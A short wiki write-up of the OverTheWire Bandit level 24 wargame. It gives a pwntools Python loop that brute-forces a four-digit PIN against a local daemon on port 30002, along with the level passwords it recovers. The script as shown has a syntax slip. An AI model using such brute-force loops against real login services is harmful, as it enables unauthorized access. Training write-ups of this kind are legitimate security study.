[Category:OverTheWire-Bandit](/Category:OverTheWire-Bandit "wikilink")
creds bandit24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

Level Goal

A daemon is listening on port 30002 and will give you the password for
bandit25 if given the password for bandit24 and a secret numeric 4-digit
pincode. There is no way to retrieve the pincode except by going through
all of the 10000 combinations, called brute-forcing.

from pwn import \* pass24="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " pin = 0 sh
= remote('localhost',30002) print(sh.readline())

for i in range(2150,10000):

`   print(i)`
`   sh.sendline(pass24 + str(format(i,"04d"))`
`   line = sh.readline()`

`   if("Wrong" not in line):`
`       print(line)`
`       print(i)`
`       break;`

UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5591 Correct\! The password of user
bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG